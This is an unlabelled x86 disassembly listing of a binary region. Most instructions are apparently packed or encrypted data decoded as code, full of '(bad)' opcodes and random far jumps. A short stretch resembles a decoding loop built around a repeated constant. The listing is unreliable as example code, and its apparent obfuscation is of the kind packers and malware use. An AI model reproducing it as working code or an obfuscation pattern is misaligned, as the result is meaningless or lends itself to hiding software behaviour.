  40c493:	sub    eax,esi
  40c495:	cmp    al,0x9f
  40c497:	es clc 
  40c499:	shr    BYTE PTR [ecx],1
  40c49b:	add    bl,ch
  40c49d:	jae    0x40c4d2
  40c49f:	test   DWORD PTR [esi],esp
  40c4a1:	fcom   DWORD PTR [eax-0x67f89703]
  40c4a7:	retf   0xdbea
  40c4aa:	stos   BYTE PTR es:[edi],al
  40c4ab:	shl    BYTE PTR cs:[ebx+0x64],0xd8
  40c4b0:	cld    
  40c4b1:	popa   
  40c4b2:	lods   eax,DWORD PTR ds:[esi]
  40c4b3:	arpl   bx,bp
  40c4b5:	lock xor DWORD PTR [eax],eax
  40c4b8:	out    0xef,al
  40c4ba:	es push esi
  40c4bc:	xchg   esp,eax
  40c4bd:	push   0xf7b8c9d3
  40c4c2:	mov    ds:0x9f20037d,eax
  40c4c7:	mov    edx,0xcf8c7bf8
  40c4cc:	pop    esi
  40c4cd:	mov    dl,0x23
  40c4cf:	(bad)  
  40c4d1:	mov    bh,0x6
  40c4d3:	scas   al,BYTE PTR es:[edi]
  40c4d4:	push   ebp
  40c4d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4d6:	and    edi,DWORD PTR [ecx]
  40c4d8:	stos   BYTE PTR es:[edi],al
  40c4d9:	out    dx,al
  40c4da:	or     eax,0xe8ed9389
  40c4df:	mov    ds:0x85a1d1f1,eax
  40c4e4:	(bad)  
  40c4e6:	cs out dx,al
  40c4e8:	fwait
  40c4e9:	push   ebx
  40c4ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4eb:	dec    al
  40c4ed:	lock xchg edx,eax
  40c4ef:	fidiv  WORD PTR [edi+0x7a1bad8d]
  40c4f5:	dec    esp
  40c4f6:	jg     0x40c4a1
  40c4f8:	adc    esi,DWORD PTR [eax-0x2b588ea7]
  40c4fe:	(bad)  
  40c4ff:	pop    ebx
  40c500:	mov    BYTE PTR [edx+0x4c0f3e11],cl
  40c506:	(bad)  
  40c508:	in     al,dx
  40c509:	sti    
  40c50a:	imul   bh
  40c50c:	push   0x8f72d92e
  40c511:	stc    
  40c512:	push   0x6d89a9ed
  40c517:	pushf  
  40c518:	sub    ebx,DWORD PTR [esi-0x6c572b01]
  40c51e:	scas   al,BYTE PTR es:[edi]
  40c51f:	ror    DWORD PTR [ebx+0x4b],0xe7
  40c523:	jge    0x40c4b0
  40c525:	xchg   esp,eax
  40c526:	inc    ebp
  40c527:	scas   eax,DWORD PTR es:[edi]
  40c528:	cld    
  40c529:	(bad)  
  40c52a:	(bad)  
  40c52c:	lods   eax,DWORD PTR ds:[esi]
  40c52d:	sahf   
  40c52e:	jp     0x40c595
  40c530:	mov    edx,0x59bba6d7
  40c535:	mov    cl,0x79
  40c537:	lods   al,BYTE PTR ds:[esi]
  40c538:	xor    cl,BYTE PTR [esi+edx*4]
  40c53b:	outs   dx,BYTE PTR ds:[esi]
  40c53c:	pop    es
  40c53d:	ficom  WORD PTR ds:0x456f74ab
  40c543:	(bad)  
  40c545:	es inc ebp
  40c547:	xchg   BYTE PTR [ebp+0x2],bl
  40c54a:	push   ecx
  40c54b:	les    ebx,FWORD PTR [esi+ebx*2+0x47a602b5]
  40c552:	mov    dh,0x2b
  40c554:	mov    bl,0x20
  40c556:	cmp    ax,0x4426
  40c55a:	icebp  
  40c55b:	push   ebp
  40c55c:	shr    BYTE PTR [esi],cl
  40c55e:	cs xchg esi,eax
  40c560:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c561:	push   ebx
  40c562:	sbb    DWORD PTR [ebp+0x37cb7c30],edi
  40c568:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c569:	pusha  
  40c56a:	mov    eax,ds:0x3f4f1a05
  40c56f:	jg     0x40c5c3
  40c571:	lods   al,BYTE PTR ds:[esi]
  40c572:	jmp    0xe479:0xb0e94825
  40c579:	xor    al,0x96
  40c57b:	ror    BYTE PTR [ebp+ebx*4-0x3c],1
  40c57f:	ja     0x40c537
  40c581:	jmp    0x40c52b
  40c583:	xchg   esi,eax
  40c584:	sub    BYTE PTR [ecx],ah
  40c586:	sbb    DWORD PTR [esi-0x3129722c],edx
  40c58c:	or     dh,al
  40c58e:	mov    edi,DWORD PTR [eax-0x46]
  40c591:	repnz dec edx
  40c593:	nop    ebp
  40c596:	test   BYTE PTR [edx-0x1956aae0],ah
  40c59c:	adc    DWORD PTR [ebp+0x65],edi
  40c59f:	hlt    
  40c5a0:	jmp    0x40c587
  40c5a2:	pusha  
  40c5a3:	push   0x25b898ec
  40c5a8:	dec    ebp
  40c5a9:	in     al,dx
  40c5aa:	adc    DWORD PTR [ecx],esp
  40c5ac:	aaa    
  40c5ad:	jl     0x40c55d
  40c5af:	or     DWORD PTR [edi+0x7e],ecx
  40c5b2:	jmp    0x89d3:0xb10ab37
  40c5b9:	call   0x414613e1
  40c5be:	jecxz  0x40c573
  40c5c0:	mov    bh,0xff
  40c5c2:	dec    esi
  40c5c3:	ret    
  40c5c4:	and    ebx,edi
  40c5c6:	and    al,BYTE PTR [eax]
  40c5c8:	pcmpgtw mm5,QWORD PTR [eax]
  40c5cb:	xchg   esi,eax
  40c5cc:	jp     0x40c55a
  40c5ce:	mov    DWORD PTR [edx+ebx*2+0x38d3a6b0],esi
  40c5d5:	sbb    eax,DWORD PTR [ebp+edx*1+0x46]
  40c5d9:	xlat   BYTE PTR ds:[ebx]
  40c5da:	test   DWORD PTR [ebx],ebx
  40c5dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5dd:	xchg   esi,eax
  40c5de:	lock mov bl,0xf8
  40c5e1:	mov    ebp,0x4c93d9ea
  40c5e6:	or     al,0x9e
  40c5e8:	push   ds
  40c5e9:	lock loope 0x40c63b
  40c5ec:	jmp    0xb356:0x9126416f
  40c5f3:	xchg   ebp,eax
  40c5f4:	pushf  
  40c5f5:	xor    BYTE PTR ds:0xbce706d,ch
  40c5fb:	arpl   sp,ax
  40c5fd:	loopne 0x40c598
  40c5ff:	je     0x40c5cc
  40c601:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c602:	push   esi
  40c603:	jmp    0x40c5d1
  40c605:	cmp    ch,BYTE PTR [edx+0x49]
  40c608:	xor    al,ah
  40c60a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c60b:	sub    al,0xae
  40c60d:	push   cs
  40c60e:	dec    edi
  40c60f:	inc    esi
  40c610:	ret    0xb5ac
  40c613:	and    al,0x4f
  40c615:	adc    al,0x44
  40c617:	jl     0x40c5a3
  40c619:	shl    edi,0x78
  40c61c:	jo     0x40c62f
  40c61e:	jne    0x40c672
  40c620:	pop    ds
  40c621:	mov    bh,0x22
  40c623:	push   esi
  40c624:	retf   
  40c625:	push   eax
  40c626:	jmp    0x40c5c7
  40c628:	pop    edx
  40c629:	daa    
  40c62a:	xor    eax,0x75710d01
  40c62f:	je     0x40c63f
  40c631:	call   0x5c48a27e
  40c636:	and    ebx,0x16
  40c639:	jnp    0x40c64c
  40c63b:	xor    ebx,DWORD PTR [edx]
  40c63d:	xchg   ecx,eax
  40c63e:	stos   BYTE PTR es:[edi],al
  40c63f:	mov    ebp,0x8ef41a0a
  40c644:	or     DWORD PTR [edx+0x13],esp
  40c647:	stos   BYTE PTR es:[edi],al
  40c648:	inc    esp
  40c649:	push   es
  40c64a:	(bad)  
  40c64b:	push   edx
  40c64c:	mov    al,0x91
  40c64e:	jmp    FWORD PTR [ebp+0x213298b7]
  40c654:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c655:	aaa    
  40c656:	xchg   DWORD PTR [edi-0x23725806],esi
  40c65c:	pop    es
  40c65d:	xor    dh,bh
  40c65f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c660:	mov    dl,0xed
  40c662:	daa    
  40c663:	scas   al,BYTE PTR es:[edi]
  40c664:	icebp  
  40c665:	jg     0x40c68a
  40c667:	in     eax,0x92
  40c669:	sub    al,0x43
  40c66b:	pop    esi
  40c66c:	fld    QWORD PTR [edi+eiz*2]
  40c66f:	inc    ebp
  40c670:	(bad)  [ebx-0x1ac57be]
  40c676:	popa   
  40c677:	cld    
  40c678:	xchg   edx,eax
  40c679:	in     eax,dx
  40c67a:	and    dh,BYTE PTR [esi]
  40c67c:	pop    es
  40c67d:	sub    ah,BYTE PTR [ebx+0x4ff6c489]
  40c683:	jmp    0xe7ca:0x8d2cc705
  40c68a:	into   
  40c68b:	adc    al,BYTE PTR [eax+0x4b]
  40c68e:	in     eax,0x10
  40c690:	aam    0x65
  40c692:	sbb    eax,0x16a1ab36
  40c697:	push   cs
  40c698:	mov    esi,0x32729b
  40c69d:	add    edi,esi
  40c69f:	div    edi
  40c6a1:	mov    edx,DWORD PTR [ebp-0x4]
  40c6a4:	xor    edx,ecx
  40c6a6:	lea    eax,[edx+eax*1+0x32729b]
  40c6ad:	mov    edx,DWORD PTR [ebp+0x8]
  40c6b0:	mov    edi,DWORD PTR [ebp-0x24]
  40c6b3:	mov    DWORD PTR [edi+edx*4],eax
  40c6b6:	mov    eax,DWORD PTR [ebp-0x18]
  40c6b9:	mov    edx,DWORD PTR [ebp+0x8]
  40c6bc:	xor    eax,ecx
  40c6be:	lea    eax,[eax+edx*1+0x32729b]
  40c6c5:	mov    DWORD PTR [ebp+0x8],eax
  40c6c8:	mov    eax,DWORD PTR [ebp-0x18]
  40c6cb:	jmp    0x40c92e
  40c6d0:	leave  
  40c6d1:	adc    bl,ah
  40c6d3:	cmp    eax,0x10f1ede3
  40c6d8:	xor    BYTE PTR [ebp-0xfd6653f],dl
  40c6de:	fild   DWORD PTR [esi+ebx*8+0x387e7e80]
  40c6e5:	jl     0x40c765
  40c6e7:	jle    0x40c72c
  40c6e9:	jne    0x40c713
  40c6eb:	xor    BYTE PTR [eax],bh
  40c6ed:	inc    ebx
  40c6ee:	or     BYTE PTR [ebp+0x14f35b89],0x14
  40c6f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6f6:	call   FWORD PTR [ecx+0x4e]
  40c6f9:	xor    al,0x40
  40c6fb:	mov    edx,0x9078bd64
  40c700:	inc    ebp
  40c701:	aad    0x2c
  40c703:	outs   dx,BYTE PTR ds:[esi]
  40c704:	push   edx
  40c705:	cli    
  40c706:	loopne 0x40c72d
  40c708:	fild   DWORD PTR [ebx+0x7e]
  40c70b:	sbb    eax,0xcf0f9b01
  40c710:	cmp    eax,0xf1ece4f3
  40c715:	pop    ebx
  40c716:	test   esi,esi
  40c718:	jl     0x40c6e5
  40c71a:	fidiv  DWORD PTR [ebp-0x225ce20e]
  40c720:	xchg   ecx,eax
  40c721:	cld    
  40c722:	sbb    eax,0xfe9121e0
  40c727:	sub    BYTE PTR [eax+0x30bc8233],ch
  40c72d:	xchg   ebx,eax
  40c72e:	add    DWORD PTR [ecx+0x7f],ebp
  40c731:	push   ecx
  40c732:	out    0xfa,eax
  40c734:	mov    esp,0xdc1d7fde
  40c739:	push   ss
  40c73a:	fwait
  40c73b:	xchg   esp,eax
  40c73c:	sub    al,0x61
  40c73e:	xchg   ebp,eax
  40c73f:	mov    ebx,0x1b025b1d
  40c744:	mov    dh,0x7e
  40c746:	xor    eax,0x7d99be50
  40c74b:	test   eax,0x81d3ce58
  40c750:	push   0xe18e3550
  40c755:	or     eax,0x56a260cf
  40c75a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c75b:	mov    ch,0x6a
  40c75d:	or     al,0x76
  40c75f:	ficomp DWORD PTR [edx+0x3]
  40c762:	dec    edx
  40c763:	adc    DWORD PTR [ebx+edx*2],edx
  40c766:	push   ebp
  40c767:	cwde   
  40c768:	fidiv  WORD PTR [ebx]
  40c76a:	lds    ebp,FWORD PTR [ebp+eiz*2+0xe332739]
  40c771:	test   edi,ecx
  40c773:	loope  0x40c747
  40c775:	arpl   ax,di
  40c777:	sub    al,0xed
  40c779:	sub    esp,edx
  40c77b:	pop    edx
  40c77c:	jl     0x40c7c6
  40c77e:	ss xor edi,edx
  40c781:	xor    eax,0xa514bc70
  40c786:	cmp    eax,0x5bd1b598
  40c78b:	je     0x40c721
  40c78d:	loope  0x40c7a1
  40c78f:	hlt    
  40c790:	jmp    0xe620:0x1ab32998
  40c797:	in     eax,dx
  40c798:	pop    ds
  40c799:	aam    0xeb
  40c79b:	(bad)  
  40c79c:	mov    ds:0xdd025aba,eax
  40c7a1:	sub    eax,0xcd2e8dbc
  40c7a6:	push   cs
  40c7a7:	cli    
  40c7a8:	cld    
  40c7a9:	fs gs in ax,0x1d
  40c7ae:	outs   dx,DWORD PTR ds:[esi]
  40c7af:	pop    edi
  40c7b0:	fsubr  DWORD PTR [eax]
  40c7b2:	dec    edi
  40c7b3:	and    eax,0xfdc725d8
  40c7b8:	les    esp,FWORD PTR [edi+0x407bf866]
  40c7be:	or     BYTE PTR [edx],dh
  40c7c0:	jns    0x40c828
  40c7c2:	or     eax,0xee4ba103
  40c7c7:	mov    ds,WORD PTR [ebx-0x46]
  40c7ca:	imul   ebx,DWORD PTR [edx+0x4a],0xfffffff9
  40c7ce:	or     eax,0xd4493ce0
  40c7d3:	pop    ss
  40c7d4:	add    BYTE PTR [ebx+ebx*2],dh
  40c7d7:	mov    edx,0xe48cc3ba
  40c7dc:	sbb    BYTE PTR [eax+ecx*1-0x2c0886fc],0x2b
  40c7e4:	or     eax,DWORD PTR [ecx+0x4f]
  40c7e7:	sbb    cl,BYTE PTR [eax]
  40c7e9:	retf   
  40c7ea:	cmp    ah,BYTE PTR [ecx-0x3a7ccd33]
  40c7f0:	and    DWORD PTR [ecx-0x60],ebp
  40c7f3:	mov    WORD PTR [edi-0x3],cs
  40c7f6:	xchg   ebp,eax
  40c7f7:	call   0xe98d:0x5d101338
  40c7fe:	call   0x1da3:0x5a816f1f
  40c805:	or     dh,BYTE PTR [edx+ecx*1-0x61e60462]
  40c80c:	pop    esi
  40c80d:	cli    
  40c80e:	or     eax,0xf7f531f0
  40c813:	xchg   ebp,eax
  40c814:	xchg   ebp,eax
  40c815:	(bad)  
  40c816:	div    DWORD PTR [ebx-0x1eaf0492]
  40c81c:	pop    edx
  40c81d:	ret    0x2b98
  40c820:	out    dx,eax
  40c821:	mov    eax,ds:0x9f8e2f7b
  40c826:	pop    es
  40c827:	sbb    BYTE PTR [ecx+ebp*1],cl
  40c82a:	ins    BYTE PTR es:[edi],dx
  40c82b:	out    0xfe,eax
  40c82d:	lods   eax,DWORD PTR ds:[esi]
  40c82e:	retf   0xc0e5
  40c831:	and    BYTE PTR [eax],dl
  40c833:	cmp    dl,dl
  40c835:	out    0xcb,eax
  40c837:	arpl   sp,bx
  40c839:	cli    
  40c83a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c83b:	sti    
  40c83c:	sub    BYTE PTR ds:0x1fca6f54,al
  40c842:	add    bl,BYTE PTR [ebx-0x30]
  40c845:	dec    eax
  40c846:	icebp  
  40c847:	(bad)  
  40c848:	fnstsw WORD PTR [ecx]
  40c84a:	pusha  
  40c84b:	add    BYTE PTR [edi+0x385825f7],cl
  40c851:	push   bx
  40c853:	dec    ebx
  40c854:	(bad)  
  40c855:	and    al,0x71
  40c857:	retf   
  40c858:	xchg   bh,bl
  40c85a:	into   
  40c85b:	mov    ecx,0xc4a3c1f0
  40c860:	ficomp DWORD PTR [ebx]
  40c862:	fmul   DWORD PTR [edi]
  40c864:	xchg   ebp,eax
  40c865:	mov    ebp,0x4df08bd0
  40c86a:	mov    dl,0x37
  40c86c:	cwde   
  40c86d:	sub    ah,0x3
  40c870:	inc    edx
  40c871:	jns    0x40c8c7
  40c873:	loop   0x40c876
  40c875:	push   ds
  40c876:	sub    eax,0x17971e6b
  40c87b:	lds    ebx,FWORD PTR [esi]
  40c87d:	jnp    0x40c80d
  40c87f:	inc    ebx
  40c880:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c881:	sub    BYTE PTR [esi],ch
  40c883:	pop    ebx
  40c884:	adc    cl,ch
  40c886:	jbe    0x40c8f5
  40c888:	mov    bh,0xaa
  40c88a:	push   ecx
  40c88b:	jge    0x40c8c8
  40c88d:	sbb    edx,DWORD PTR [ebx+0x18]
  40c890:	pop    esi
  40c891:	sbb    ecx,DWORD PTR [esi]
  40c893:	out    dx,al
  40c894:	aam    0x81
  40c896:	adc    ch,bh
  40c898:	add    ch,bh
  40c89a:	lock les esp,FWORD PTR [ebx]
  40c89d:	sub    al,0x3c
  40c89f:	sub    DWORD PTR [eax-0x45],ecx
  40c8a2:	inc    esp
  40c8a3:	nop
  40c8a4:	sub    eax,0x7403f37e
  40c8a9:	pop    eax
  40c8aa:	push   cs
  40c8ab:	add    edi,DWORD PTR [eax]
  40c8ad:	mov    esp,0x1cb0bc9f
  40c8b2:	test   eax,0x7c5e0617
  40c8b7:	push   sp
  40c8b9:	mov    ecx,0x57e2a76
  40c8be:	fwait
  40c8bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8c0:	or     al,0xee
  40c8c2:	jbe    0x40c8bc
  40c8c4:	adc    al,0x43
  40c8c6:	pop    esi
  40c8c7:	fistp  DWORD PTR [edx-0x1e]
  40c8ca:	dec    edi
  40c8cb:	data16 test al,0xf
  40c8ce:	int    0x59
  40c8d0:	aam    0xa9
  40c8d2:	sub    cl,BYTE PTR [ebp-0x62655a29]
  40c8d8:	hlt    
  40c8d9:	(bad)  [edi+0x2b]
  40c8dc:	or     DWORD PTR [edx],eax
  40c8de:	xchg   edx,eax
  40c8df:	xchg   ecx,eax
  40c8e0:	lock lock inc edi
  40c8e3:	xor    eax,0x6fe33dcc
  40c8e8:	inc    ebx
  40c8e9:	mov    ds:0x11aa5bb3,al
  40c8ee:	mov    ds:0xe09eaa26,eax
  40c8f3:	lds    esi,FWORD PTR [edx]
  40c8f5:	lock fnstenv [esi]
  40c8f8:	or     DWORD PTR [edx+0x27],0xffffffd0
  40c8fc:	jecxz  0x40c89a
  40c8fe:	ins    DWORD PTR es:[edi],dx
  40c8ff:	pop    ss
  40c900:	pop    edx
  40c901:	jp     0x40c957
  40c903:	arpl   WORD PTR [eax],bx
  40c905:	ror    BYTE PTR [esi-0x1b],0x36
  40c909:	sub    ebx,edi
  40c90b:	mov    ch,0x5f
  40c90d:	inc    ebp
  40c90e:	shl    BYTE PTR [edi],cl
  40c910:	jle    0x40c90a
  40c912:	vmread edx,ecx
  40c915:	addr16 xchg ebp,eax
  40c917:	fidiv  DWORD PTR [ebp+0x15033e69]
  40c91d:	imul   esi,ebp,0xffffff9f
  40c920:	push   esi
  40c921:	mov    ds:0x727e724b,eax
  40c926:	adc    ebx,DWORD PTR [eax-0x61]
  40c929:	call   0x558b:0xafbfd40d
  40c930:	adc    al,0x33
  40c932:	shr    ecx,0x5e
  40c935:	add    al,BYTE PTR [eax]
  40c937:	add    BYTE PTR [edi],al
  40c939:	mov    ah,0x6
  40c93b:	cwde   
  40c93c:	mov    ch,0xa8
  40c93e:	mov    eax,ds:0x31ca67b1
  40c943:	cmp    DWORD PTR [edx-0x71],ecx
  40c946:	jl     0x40c984
  40c948:	cwde   
  40c949:	mov    ?,WORD PTR [esi+0x7e]
  40c94c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c950:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c951:	aam    0x9d
  40c953:	retf   
  40c954:	add    ch,BYTE PTR [edx-0x56]
  40c957:	fldenv [ebp+edi*1+0x26875a7f]
  40c95e:	enter  0x3f2c,0x8
  40c962:	out    0x14,al
  40c964:	ret    
  40c965:	aad    0xbd
  40c967:	iret   
  40c968:	or     al,0xc3
  40c96a:	pop    edx
  40c96b:	or     eax,0x38ce364f
  40c970:	adc    DWORD PTR [ebp+0x6c],0x933a884b
  40c977:	gs cdq 
  40c979:	out    dx,eax
  40c97a:	dec    edx
  40c97b:	je     0x40c944
  40c97d:	lock lahf 
  40c97f:	xchg   edi,eax
  40c980:	retf   
  40c981:	xor    ch,BYTE PTR [ebx+0x21]
  40c984:	cmp    DWORD PTR [ebp+0x4fa75f1],esp
  40c98a:	ins    DWORD PTR es:[edi],dx
  40c98b:	in     eax,dx
  40c98c:	fisub  WORD PTR [esi]
  40c98e:	jg     0x40c9c1
  40c990:	lea    esp,[edx]
  40c992:	sbb    al,0x4c
  40c994:	xlat   BYTE PTR ds:[ebx]
  40c995:	xor    ebp,eax
  40c997:	sbb    ah,bl
  40c999:	jg     0x40c9f7
  40c99b:	sbb    al,ah
  40c99d:	sbb    BYTE PTR [esp+ebp*1-0x32],bl
  40c9a1:	stc    
  40c9a2:	fwait
  40c9a3:	xchg   esi,eax
  40c9a4:	into   
  40c9a5:	test   eax,0x1030ca1b
  40c9aa:	imul   esi,esp,0xfffffffe
  40c9ad:	jo     0x40ca1d
  40c9af:	cmp    DWORD PTR [ecx+0x5e],ebx
  40c9b2:	mov    WORD PTR [eax+0x18],ds
  40c9b5:	mov    al,BYTE PTR [ebx+0x27fe0ab2]
  40c9bb:	dec    esi
  40c9bc:	test   DWORD PTR [ecx-0x2f],eax
  40c9bf:	mov    al,BYTE PTR ds:0x87dead4e
  40c9c5:	(bad)  
  40c9c6:	loopne 0x40c974
  40c9c8:	pop    ss
  40c9c9:	ret    
  40c9ca:	scas   eax,DWORD PTR es:[edi]
  40c9cb:	daa    
  40c9cc:	inc    esi
  40c9cd:	jle    0x40ca40
  40c9cf:	xor    ebp,DWORD PTR [esi+0x7f2e6b7e]
  40c9d5:	aaa    
  40c9d6:	jbe    0x40c987
  40c9d8:	test   al,0xad
  40c9da:	mov    ebp,cs
  40c9dc:	mov    ch,0x70
  40c9de:	mov    bh,al
  40c9e0:	pushf  
  40c9e1:	sbb    bh,cl
  40c9e3:	fild   DWORD PTR [ebx]
  40c9e5:	sbb    al,0xb2
  40c9e7:	mov    bl,0x33
  40c9e9:	or     eax,eax
  40c9eb:	cmp    bl,dl
  40c9ed:	xchg   edx,eax
  40c9ee:	add    DWORD PTR [esi+edx*4-0x325986e5],edx
  40c9f5:	lahf   
  40c9f6:	dec    ebx
  40c9f7:	sti    
  40c9f8:	ret    
  40c9f9:	sub    BYTE PTR [ebx],cl
  40c9fb:	pop    edi
  40c9fc:	inc    esi
  40c9fd:	pop    es
  40c9fe:	cld    
  40c9ff:	mov    fs,WORD PTR [edx]
  40ca01:	adc    BYTE PTR ds:0x1c2ed498,bh
  40ca07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca08:	in     al,0x71
  40ca0a:	loope  0x40ca24
  40ca0c:	push   es
  40ca0d:	test   edx,esi
  40ca0f:	dec    edx
  40ca10:	(bad)  
  40ca11:	push   edx
  40ca12:	iret   
  40ca13:	addr16 mov cx,0xa688
  40ca18:	fucomip st,st(5)
  40ca1a:	xlat   BYTE PTR ds:[ebx]
  40ca1b:	inc    esi
  40ca1c:	xchg   edi,eax
  40ca1d:	sub    ah,BYTE PTR [esi]
  40ca1f:	or     DWORD PTR [ebx],ecx
  40ca21:	dec    ebp
  40ca22:	fs aaa 
  40ca24:	dec    ebx
  40ca25:	mov    ah,0x8c
  40ca27:	xor    ch,cl
  40ca29:	and    eax,0x42bfd131
  40ca2e:	in     al,dx
  40ca2f:	cmp    al,0xfe
  40ca31:	or     eax,0x3460b553
  40ca36:	cmc    
  40ca37:	jno    0x40ca26
  40ca39:	scas   al,BYTE PTR es:[edi]
  40ca3a:	sbb    BYTE PTR [eax],0x41
  40ca3d:	pop    eax
  40ca3e:	push   cs
  40ca3f:	or     DWORD PTR [ecx-0x7a16de06],ebx
  40ca45:	jge    0x40ca84
  40ca47:	xchg   ebp,eax
  40ca48:	imul   ebx,DWORD PTR [ebx-0x1f],0xce3fd0f5
  40ca4f:	leave  
  40ca50:	ins    BYTE PTR es:[edi],dx
  40ca51:	sub    BYTE PTR [edi-0x28603a64],0x27
  40ca58:	cmp    al,0x50
  40ca5a:	clc    
  40ca5b:	add    DWORD PTR [esi+0x2b],esp
  40ca5e:	in     al,dx
  40ca5f:	pmuludq mm7,QWORD PTR [ebp+0x78]
  40ca63:	jb     0x40caac
  40ca65:	sti    
  40ca66:	(bad)  
  40ca67:	shl    BYTE PTR [ebx-0x11],0xed
  40ca6b:	stos   BYTE PTR es:[edi],al
  40ca6c:	pushf  
  40ca6d:	mov    dh,BYTE PTR [ebp-0x2]
  40ca70:	jo     0x40ca79
  40ca72:	out    dx,al
  40ca73:	dec    ebp
  40ca74:	mov    dl,0x62
  40ca76:	dec    ebx
  40ca77:	mov    esi,0x7a3be39b
  40ca7c:	jbe    0x40cadb
  40ca7e:	fld    TBYTE PTR [eax+0x3ae4423c]
  40ca84:	inc    esi
  40ca85:	mov    dh,0x29
  40ca87:	xchg   edx,eax
  40ca88:	outs   dx,DWORD PTR ds:[esi]
  40ca89:	daa    
  40ca8a:	jno    0x40cab5
  40ca8c:	jbe    0x40ca8a
  40ca8e:	mov    edx,0x9b51dc0d
  40ca93:	cmp    ah,BYTE PTR [edi+0x6cd5b7b3]
  40ca99:	out    dx,eax
  40ca9a:	lds    esi,FWORD PTR [edi]
  40ca9c:	retf   0xc46f
  40ca9f:	into   
  40caa0:	int    0x6a
  40caa2:	stc    
  40caa3:	or     dh,BYTE PTR [edx+eax*1]
  40caa6:	loopne 0x40caff
  40caa8:	jge    0x40ca7b
  40caaa:	(bad)  
  40caab:	fwait
  40caac:	stc    
  40caad:	pusha  
  40caae:	cmp    BYTE PTR [edi+eax*1+0x49a414a1],al
  40cab5:	int3   
  40cab6:	pop    edi
  40cab7:	hlt    
  40cab8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cab9:	shl    ecx,0xd5
  40cabc:	in     eax,0x3e
  40cabe:	jmp    0x40cada
  40cac0:	mov    eax,ds:0xbf16f776
  40cac5:	sahf   
  40cac6:	iret   
  40cac7:	inc    esi
  40cac8:	cli    
  40cac9:	xor    eax,DWORD PTR [ecx-0x11]
  40cacc:	or     al,0x4e
  40cace:	xchg   edx,eax
  40cacf:	inc    edi
  40cad0:	and    esi,ecx
  40cad2:	inc    ebp
  40cad3:	ds arpl sp,ax
  40cad6:	leave  
  40cad7:	imul   eax,DWORD PTR [edx+esi*1+0x22],0x780c05ac
  40cadf:	push   esi
  40cae0:	sub    edx,edx
  40cae2:	les    ebx,FWORD PTR [esi+0x0]
  40cae5:	stos   BYTE PTR es:[edi],al
  40cae6:	cs ret 0x8cb8
  40caea:	mov    eax,0x77d78b16
  40caef:	das    
  40caf0:	push   esi
  40caf1:	xchg   esi,eax
  40caf2:	int    0x4f
  40caf4:	jle    0x40ca83
  40caf6:	loop   0x40cb3f
  40caf8:	sub    eax,0xe003570a
  40cafd:	jno    0x40cab2
  40caff:	sbb    bh,al
  40cb01:	(bad)  
  40cb03:	pusha  
  40cb04:	inc    edi
  40cb05:	push   ds
  40cb06:	in     al,0x4e
  40cb08:	jne    0x40cac3
  40cb0a:	sub    BYTE PTR [edi-0x76],al
  40cb0d:	push   ds
  40cb0e:	mov    eax,0x76a43a9b
  40cb13:	push   es
  40cb14:	mov    ebp,0x4da8121d
  40cb19:	inc    esi
  40cb1a:	mov    edi,0xf591d0d8
  40cb1f:	fwait
  40cb20:	in     al,dx
  40cb21:	iret   
  40cb22:	into   
  40cb23:	fcomp  DWORD PTR [edx]
  40cb25:	jg     0x40cac7
  40cb27:	dec    ecx
  40cb28:	push   ebp
  40cb29:	sbb    al,0x59
  40cb2b:	xchg   ebx,eax
  40cb2c:	or     ah,BYTE PTR [ecx+eiz*1+0x1856f658]
  40cb33:	add    ebp,DWORD PTR [edx]
  40cb35:	pop    esp
  40cb36:	pop    ebx
  40cb37:	shl    DWORD PTR [ebx],1
  40cb39:	std    
  40cb3a:	xor    eax,0xaaa58e02
  40cb3f:	pop    es
  40cb40:	mov    edi,0x29f6dcf1
  40cb45:	xlat   BYTE PTR ds:[ebx]
  40cb46:	comiss xmm4,xmm1
  40cb49:	push   0xffffff8a
  40cb4b:	into   
  40cb4c:	je     0x40cadc
  40cb4e:	shl    cl,cl
  40cb50:	out    dx,eax
  40cb51:	rol    bh,0xe9
  40cb54:	call   0x3fc5:0x4617bd6a
  40cb5b:	inc    edx
  40cb5c:	popf   
  40cb5d:	scas   al,BYTE PTR es:[edi]
  40cb5e:	in     eax,dx
  40cb5f:	mov    eax,ds:0x23bac967
  40cb64:	and    al,0x4
  40cb66:	add    eax,0xa7b78440
  40cb6b:	outs   dx,DWORD PTR ds:[esi]
  40cb6c:	div    BYTE PTR [esi]
  40cb6e:	scas   al,BYTE PTR es:[edi]
  40cb6f:	push   0x591abbe4
  40cb74:	and    DWORD PTR [ecx-0x50],esi
  40cb77:	xchg   ebx,eax
  40cb78:	mov    eax,DWORD PTR [esi-0x6a3c35c2]
  40cb7e:	icebp  
  40cb7f:	ins    DWORD PTR es:[edi],dx
  40cb80:	(bad)  
  40cb81:	jo     0x40cb5a
  40cb83:	loop   0x40cbb2
  40cb85:	mov    ecx,0x875d1008
  40cb8a:	(bad)  
  40cb8b:	jns    0x40cb9e
  40cb8d:	sub    BYTE PTR [eax],bh
  40cb8f:	out    0xeb,eax
  40cb91:	sub    DWORD PTR [ebx],edx
  40cb93:	jmp    0xaf0f:0xc60392ae
  40cb9a:	add    cl,BYTE PTR [ebx-0x2ecc03ab]
  40cba0:	mov    ecx,DWORD PTR [ebp+0x8]
  40cba3:	lea    ecx,[edx+ecx*1+0x32729b]
  40cbaa:	cmp    ecx,eax
  40cbac:	jne    0x40c41f
  40cbb2:	mov    ebx,esi
  40cbb4:	jmp    0x40cbbe
  40cbb9:	mov    ebx,0x32729b
